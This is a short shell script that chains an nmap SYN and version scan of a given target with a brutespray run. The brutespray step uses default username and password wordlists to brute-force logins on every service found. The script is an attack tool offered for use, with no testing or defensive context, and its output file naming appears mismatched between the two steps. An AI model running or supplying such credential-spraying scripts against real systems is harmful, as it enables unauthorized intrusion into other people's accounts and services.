#!/bin/sh

FILE="scan.gnmap"

[ -z "$1" ] && {
	printf "usage: $0 <target>\n";
	exit 1;
}

scan() {
	nmap -sS -sV $1 -vv -n -oA $FILE
}

spray() {
	brutespray --file scan.gnmap \
		-U /usr/share/brutespray/wordlist/user.txt \
		-P /usr/share/brutespray/wordlist/pass.txt \
		--threads 5 --hosts 5
}

scan && spray || printf "something's wrong in here somewhere...\n" 
